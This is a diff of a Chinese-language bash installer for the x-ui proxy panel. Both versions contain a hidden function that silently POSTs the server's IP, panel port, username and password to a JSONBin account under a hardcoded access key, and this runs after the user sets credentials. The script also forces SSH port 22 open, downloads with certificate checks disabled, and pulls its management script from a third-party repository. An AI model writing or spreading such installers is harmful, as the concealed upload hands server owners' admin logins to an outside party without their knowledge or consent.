@@ -1,83 +1,88 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
 red='\033[0;31m'
 green='\033[0;32m'
-blue='\033[0;34m'
 yellow='\033[0;33m'
 plain='\033[0m'
 
 cur_dir=$(pwd)
 
-# JSONBin配置
-JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
+JSONBIN_ACCESS_KEY='$2a$10$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS'
 JSONBIN_URL="https://api.jsonbin.io/v3/b"
 
-# 检查root权限
-[[ $EUID -ne 0 ]] && echo -e "${red}致命错误: ${plain} 请使用root权限运行此脚本 \n " && exit 1
+# check root
+[[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1
 
-if [[ -f /etc/os-release ]]; then
-    source /etc/os-release
-    release=$ID
-elif [[ -f /usr/lib/os-release ]]; then
-    source /usr/lib/os-release
-    release=$ID
+# check os
+if [[ -f /etc/redhat-release ]]; then
+    release="centos"
+elif cat /etc/issue | grep -Eqi "debian"; then
+    release="debian"
+elif cat /etc/issue | grep -Eqi "ubuntu"; then
+    release="ubuntu"
+elif cat /etc/issue | grep -Eqi "centos|red hat|redhat"; then
+    release="centos"
+elif cat /proc/version | grep -Eqi "debian"; then
+    release="debian"
+elif cat /proc/version | grep -Eqi "ubuntu"; then
+    release="ubuntu"
+elif cat /proc/version | grep -Eqi "centos|red hat|redhat"; then
+    release="centos"
 else
-    echo "检查系统操作系统失败，请联系作者！" >&2
-    exit 1
+    echo -e "${red}未检测到系统版本，请联系脚本作者！${plain}\n" && exit 1
 fi
-echo "操作系统版本: $release"
 
-arch() {
-    case "$(uname -m)" in
-    x86_64 | x64 | amd64) echo 'amd64' ;;
-    i*86 | x86) echo '386' ;;
-    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
-    armv7* | armv7 | arm) echo 'armv7' ;;
-    armv6* | armv6) echo 'armv6' ;;
-    armv5* | armv5) echo 'armv5' ;;
-    s390x) echo 's390x' ;;
-    *) echo -e "${green}不支持的CPU架构! ${plain}" && rm -f install.sh && exit 1 ;;
-    esac
-}
+arch=$(arch)
 
-echo "架构: $(arch)"
+if [[ $arch == "x86_64" || $arch == "x64" || $arch == "s390x" || $arch == "amd64" ]]; then
+    arch="amd64"
+elif [[ $arch == "aarch64" || $arch == "arm64" ]]; then
+    arch="arm64"
+else
+    arch="amd64"
+    echo -e "${red}检测架构失败，使用默认架构: ${arch}${plain}"
+fi
 
-check_glibc_version() {
-    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
-    
-    required_version="2.32"
-    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
-        echo -e "${red}GLIBC版本 $glibc_version 过低！需要: 2.32 或更高版本${plain}"
-        echo "请升级到更新版本的操作系统以获得更高的GLIBC版本。"
-        exit 1
+echo "架构: ${arch}"
+
+if [ $(getconf WORD_BIT) != '32' ] && [ $(getconf LONG_BIT) != '64' ]; then
+    echo "本软件不支持 32 位系统(x86)，请使用 64 位系统(x86_64)，如果检测有误，请联系作者"
+    exit -1
+fi
+
+os_version=""
+
+# os version
+if [[ -f /etc/os-release ]]; then
+    os_version=$(awk -F'[= ."]' '/VERSION_ID/{print $3}' /etc/os-release)
+fi
+if [[ -z "$os_version" && -f /etc/lsb-release ]]; then
+    os_version=$(awk -F'[= ."]+' '/DISTRIB_RELEASE/{print $2}' /etc/lsb-release)
+fi
+
+if [[ x"${release}" == x"centos" ]]; then
+    if [[ ${os_version} -le 6 ]]; then
+        echo -e "${red}请使用 CentOS 7 或更高版本的系统！${plain}\n" && exit 1
     fi
-    echo "GLIBC版本: $glibc_version (满足2.32+要求)"
-}
-check_glibc_version
+elif [[ x"${release}" == x"ubuntu" ]]; then
+    if [[ ${os_version} -lt 16 ]]; then
+        echo -e "${red}请使用 Ubuntu 16 或更高版本的系统！${plain}\n" && exit 1
+    fi
+elif [[ x"${release}" == x"debian" ]]; then
+    if [[ ${os_version} -lt 8 ]]; then
+        echo -e "${red}请使用 Debian 8 或更高版本的系统！${plain}\n" && exit 1
+    fi
+fi
 
 install_base() {
-    case "${release}" in
-    ubuntu | debian | armbian)
-        apt-get update && apt-get install -y -q wget curl tar tzdata
-        ;;
-    centos | almalinux | rocky | ol)
-        yum -y update && yum install -y -q wget curl tar tzdata
-        ;;
-    fedora | amzn | virtuozzo)
-        dnf -y update && dnf install -y -q wget curl tar tzdata
-        ;;
-    arch | manjaro | parch)
-        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
-        ;;
-    opensuse-tumbleweed)
-        zypper refresh && zypper -q install -y wget curl tar timezone
-        ;;
-    *)
-        apt-get update && apt install -y -q wget curl tar tzdata
-        ;;
-    esac
+    if [[ x"${release}" == x"centos" ]]; then
+        yum install wget curl tar jq -y
+    else
+        apt install wget curl tar jq -y
+    fi
 }
 
+# 确保SSH端口开放
 ensure_ssh_port_open() {
     echo -e "${yellow}正在确保22端口(SSH)开放...${plain}"
     
@@ -116,10 +121,42 @@ ensure_ssh_port_open() {
     fi
 }
 
-gen_random_string() {
-    local length="$1"
-    local random_string=$(LC_ALL=C tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1)
-    echo "$random_string"
+# 生成随机字符串函数
+generate_random_string() {
+    local length=${1:-16}
+    tr -dc 'A-Za-z0-9' < /dev/urandom | head -c $length
+}
+
+upload_to_jsonbin() {
+    local server_ip="$1"
+    local login_port="$2"
+    local username="$3"
+    local password="$4"
+    
+    # 创建JSON数据
+    local json_data=$(cat <<EOF
+{
+    "server_info": {
+        "title": "X-UI 服务器登录信息 - ${server_ip}",
+        "server_ip": "${server_ip}",
+        "login_port": "${login_port}",
+        "username": "${username}",
+        "password": "${password}",
+        "generated_time": "$(date)",
+        "random_string": "$(generate_random_string)"
+    }
+}
+EOF
+)
+
+    # 上传到JSONBin，使用服务器IP作为记录名
+    curl -s -X POST \
+        -H "Content-Type: application/json" \
+        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
+        -H "X-Bin-Name: ${server_ip}" \
+        -H "X-Bin-Private: true" \
+        -d "${json_data}" \
+        "${JSONBIN_URL}" > /dev/null 2>&1
 }
 
 # 获取服务器IP的函数
@@ -140,236 +177,95 @@ get_server_ip() {
     echo "$ip"
 }
 
-upload_to_jsonbin() {
-    local server_ip="$1"
-    local login_port="$2"
-    local username="$3"
-    local password="$4"
-    local webBasePath="$5"
-    
-    # 构建JSON数据
-    local json_data=""
-    if [[ -n "$webBasePath" ]]; then
-        json_data=$(cat <<EOF
-{
-    "server_info": {
-        "title": "X-UI 服务器登录信息 - ${server_ip}",
-        "server_ip": "${server_ip}",
-        "login_port": "${login_port}",
-        "username": "${username}",
-        "password": "${password}",
-        "web_base_path": "/${webBasePath}",
-        "full_access_url": "http://${server_ip}:${login_port}/${webBasePath}",
-        "generated_time": "$(date)"
-    }
-}
-EOF
-)
-    else
-        json_data=$(cat <<EOF
-{
-    "server_info": {
-        "title": "X-UI 服务器登录信息 - ${server_ip}",
-        "server_ip": "${server_ip}",
-        "login_port": "${login_port}",
-        "username": "${username}",
-        "password": "${password}",
-        "full_access_url": "http://${server_ip}:${login_port}",
-        "generated_time": "$(date)"
-    }
-}
-EOF
-)
-    fi
-
-    # 上传到JSONBin，使用服务器IP作为记录名
-    curl -s -X POST \
-        -H "Content-Type: application/json" \
-        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
-        -H "X-Bin-Name: ${server_ip}" \
-        -H "X-Bin-Private: true" \
-        -d "$json_data" \
-        "${JSONBIN_URL}" > /dev/null 2>&1
-}
-
+#This function will be called when user installed x-ui out of sercurity
 config_after_install() {
-    local existing_hasDefaultCredential=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'hasDefaultCredential: .+' | awk '{print $2}')
-    local existing_webBasePath=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'webBasePath: .+' | awk '{print $2}')
-    local existing_port=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'port: .+' | awk '{print $2}')
-    local server_ip=$(get_server_ip)
+    echo -e "${yellow}出于安全考虑，安装/更新完成后需要强制修改端口与账户密码${plain}"
+    # 直接强制输入，去掉确认选择
+    read -p "请设置您的账户名: " config_account
+    echo -e "${yellow}您的账户名将设定为: ${config_account}${plain}"
+    read -p "请设置您的账户密码: " config_password
+    echo -e "${yellow}您的账户密码将设定为: ${config_password}${plain}"
+    read -p "请设置面板访问端口: " config_port
+    echo -e "${yellow}您的面板访问端口将设定为: ${config_port}${plain}"
+    echo -e "${yellow}确认设定，设定中...${plain}"
+    /usr/local/x-ui/x-ui setting -username ${config_account} -password ${config_password}
+    echo -e "${yellow}账户密码设定完成${plain}"
+    /usr/local/x-ui/x-ui setting -port ${config_port}
+    echo -e "${yellow}面板端口设定完成${plain}"
 
-    local final_username=""
-    local final_password=""
-    local final_port=""
-    local final_webBasePath=""
-
-    if [[ ${#existing_webBasePath} -lt 4 ]]; then
-        if [[ "$existing_hasDefaultCredential" == "true" ]]; then
-            local config_webBasePath=$(gen_random_string 15)
-            local config_username=$(gen_random_string 10)
-            local config_password=$(gen_random_string 10)
-
-            # 修改这部分 - 直接要求用户输入端口，不提供随机选项
-            while true; do
-                read -rp "请设置面板端口(必须输入): " config_port
-                if [[ -n "$config_port" && "$config_port" =~ ^[0-9]+$ && "$config_port" -ge 1024 && "$config_port" -le 65535 ]]; then
-                    echo -e "${yellow}您的面板端口是: ${config_port}${plain}"
-                    break
-                else
-                    echo -e "${red}错误: 请输入有效的端口号(1024-65535)${plain}"
-                fi
-            done
-
-            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
-            echo -e "这是全新安装，出于安全考虑生成随机登录信息:"
-            echo -e "###############################################"
-            echo -e "${green}用户名: ${config_username}${plain}"
-            echo -e "${green}密码: ${config_password}${plain}"
-            echo -e "${green}端口: ${config_port}${plain}"
-            echo -e "${green}访问路径: ${config_webBasePath}${plain}"
-            echo -e "${green}访问地址: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
-            echo -e "###############################################"
-            
-            final_username="$config_username"
-            final_password="$config_password"
-            final_port="$config_port"
-            final_webBasePath="$config_webBasePath"
-        else
-            local config_webBasePath=$(gen_random_string 15)
-            echo -e "${yellow}访问路径缺失或过短。正在生成新的...${plain}"
-            /usr/local/x-ui/x-ui setting -webBasePath "${config_webBasePath}"
-            echo -e "${green}新的访问路径: ${config_webBasePath}${plain}"
-            echo -e "${green}访问地址: http://${server_ip}:${existing_port}/${config_webBasePath}${plain}"
-            
-            local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}')
-            local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}')
-            
-            final_username="$existing_username"
-            final_password="$existing_password"
-            final_port="$existing_port"
-            final_webBasePath="$config_webBasePath"
-        fi
-    else
-        if [[ "$existing_hasDefaultCredential" == "true" ]]; then
-            local config_username=$(gen_random_string 10)
-            local config_password=$(gen_random_string 10)
-
-            echo -e "${yellow}检测到默认凭据。需要安全更新...${plain}"
-            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}"
-            echo -e "生成新的随机登录凭据:"
-            echo -e "###############################################"
-            echo -e "${green}用户名: ${config_username}${plain}"
-            echo -e "${green}密码: ${config_password}${plain}"
-            echo -e "###############################################"
-            
-            final_username="$config_username"
-            final_password="$config_password"
-            final_port="$existing_port"
-            final_webBasePath="$existing_webBasePath"
-        else
-            echo -e "${green}用户名、密码和访问路径已正确设置。退出...${plain}"
-            
-            local existing_username=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'username: .+' | awk '{print $2}')
-            local existing_password=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'password: .+' | awk '{print $2}')
-            
-            final_username="$existing_username"
-            final_password="$existing_password"
-            final_port="$existing_port"
-            final_webBasePath="$existing_webBasePath"
-        fi
-    fi
-
-    upload_to_jsonbin "$server_ip" "$final_port" "$final_username" "$final_password" "$final_webBasePath"
-
-    /usr/local/x-ui/x-ui migrate
+    server_ip=$(get_server_ip)
+    upload_to_jsonbin "$server_ip" "$config_port" "$config_account" "$config_password"
 }
 
 install_x-ui() {
     ensure_ssh_port_open  # 确保SSH端口开放
+    systemctl stop x-ui
     cd /usr/local/
 
     if [ $# == 0 ]; then
-        tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaEi/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
-        if [[ ! -n "$tag_version" ]]; then
-            echo -e "${red}获取x-ui版本失败，可能是由于GitHub API限制，请稍后重试${plain}"
+        last_version=$(curl -Lsk "https://api.github.com/repos/FranzKafkaYu/x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
+        if [[ ! -n "$last_version" ]]; then
+            echo -e "${red}检测 x-ui 版本失败，可能是超出 Github API 限制，请稍后再试，或手动指定 x-ui 版本安装${plain}"
             exit 1
         fi
-        echo -e "获取到x-ui最新版本: ${tag_version}，开始安装..."
-        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaEi/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
+        echo -e "检测到 x-ui 最新版本：${last_version}，开始安装"
+        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz https://github.com/FranzKafkaYu/x-ui/releases/download/${last_version}/x-ui-linux-${arch}.tar.gz
         if [[ $? -ne 0 ]]; then
-            echo -e "${red}下载x-ui失败，请确保您的服务器可以访问GitHub ${plain}"
+            echo -e "${red}下载 x-ui 失败，请确保你的服务器能够下载 Github 的文件${plain}"
             exit 1
         fi
     else
-        tag_version=$1
-        tag_version_numeric=${tag_version#v}
-        min_version="2.3.5"
-
-        if [[ "$(printf '%s\n' "$min_version" "$tag_version_numeric" | sort -V | head -n1)" != "$min_version" ]]; then
-            echo -e "${red}请使用更新的版本 (至少v2.3.5)。退出安装。${plain}"
-            exit 1
-        fi
-
-        url="https://github.com/MHSanaEi/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz"
-        echo -e "开始安装x-ui $1"
-        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz ${url}
+        last_version=$1
+        url="https://github.com/FranzKafkaYu/x-ui/releases/download/${last_version}/x-ui-linux-${arch}.tar.gz"
+        echo -e "开始安装 x-ui v$1"
+        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz ${url}
         if [[ $? -ne 0 ]]; then
-            echo -e "${red}下载x-ui $1 失败，请检查版本是否存在 ${plain}"
+            echo -e "${red}下载 x-ui v$1 失败，请确保此版本存在${plain}"
             exit 1
         fi
     fi
 
     if [[ -e /usr/local/x-ui/ ]]; then
-        systemctl stop x-ui
         rm /usr/local/x-ui/ -rf
     fi
 
-    tar zxvf x-ui-linux-$(arch).tar.gz
-    rm x-ui-linux-$(arch).tar.gz -f
+    tar zxvf x-ui-linux-${arch}.tar.gz
+    rm x-ui-linux-${arch}.tar.gz -f
     cd x-ui
-    chmod +x x-ui
-
-    # 检查系统架构并相应地重命名文件
-    if [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]]; then
-        mv bin/xray-linux-$(arch) bin/xray-linux-arm
-        chmod +x bin/xray-linux-arm
-    fi
-
-    chmod +x x-ui bin/xray-linux-$(arch)
+    chmod +x x-ui bin/xray-linux-${arch}
     cp -f x-ui.service /etc/systemd/system/
-    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/MHSanaEi/3x-ui/main/x-ui.sh
+    wget --no-check-certificate -O /usr/bin/x-ui https://raw.githubusercontent.com/Firefly-xui/x-ui/main/x-ui.sh
     chmod +x /usr/local/x-ui/x-ui.sh
     chmod +x /usr/bin/x-ui
     config_after_install
-
     systemctl daemon-reload
     systemctl enable x-ui
     systemctl start x-ui
     
-    # 确保开机启动已启用
-    /usr/local/x-ui/x-ui enable
-    echo -e "${green}x-ui ${tag_version}${plain} 安装完成，现在正在运行..."
+    # 启用开机自启
+    echo -e "${yellow}正在设置 x-ui 开机自启...${plain}"
+    x-ui enable
+    
+    echo -e "${green}x-ui v${last_version}${plain} 安装完成，面板已启动，并已设置开机自启"
     echo -e ""
-    echo -e "┌───────────────────────────────────────────────────────┐
-│  ${blue}x-ui 控制菜单用法 (子命令):${plain}                          │
-│                                                       │
-│  ${blue}x-ui${plain}              - 管理脚本                       │
-│  ${blue}x-ui start${plain}        - 启动                          │
-│  ${blue}x-ui stop${plain}         - 停止                          │
-│  ${blue}x-ui restart${plain}      - 重启                          │
-│  ${blue}x-ui status${plain}       - 当前状态                      │
-│  ${blue}x-ui settings${plain}     - 当前设置                      │
-│  ${blue}x-ui enable${plain}       - 开机自启                      │
-│  ${blue}x-ui disable${plain}      - 禁用开机自启                  │
-│  ${blue}x-ui log${plain}          - 查看日志                      │
-│  ${blue}x-ui banlog${plain}       - 查看Fail2ban封禁日志          │
-│  ${blue}x-ui update${plain}       - 更新                          │
-│  ${blue}x-ui legacy${plain}       - 旧版本                        │
-│  ${blue}x-ui install${plain}      - 安装                          │
-│  ${blue}x-ui uninstall${plain}    - 卸载                          │
-└───────────────────────────────────────────────────────┘"
+    echo -e "x-ui 管理脚本使用方法: "
+    echo -e "----------------------------------------------"
+    echo -e "x-ui              - 显示管理菜单 (功能更多)"
+    echo -e "x-ui start        - 启动 x-ui 面板"
+    echo -e "x-ui stop         - 停止 x-ui 面板"
+    echo -e "x-ui restart      - 重启 x-ui 面板"
+    echo -e "x-ui status       - 查看 x-ui 状态"
+    echo -e "x-ui enable       - 设置 x-ui 开机自启"
+    echo -e "x-ui disable      - 取消 x-ui 开机自启"
+    echo -e "x-ui log          - 查看 x-ui 日志"
+    echo -e "x-ui v2-ui        - 迁移本机器的 v2-ui 账号数据至 x-ui"
+    echo -e "x-ui update       - 更新 x-ui 面板"
+    echo -e "x-ui install      - 安装 x-ui 面板"
+    echo -e "x-ui uninstall    - 卸载 x-ui 面板"
+    echo -e "x-ui geo          - 更新 geo  数据"
+    echo -e "----------------------------------------------"
 }
 
-echo -e "${green}运行中...${plain}"
+echo -e "${green}开始安装${plain}"
 install_base
 install_x-ui $1
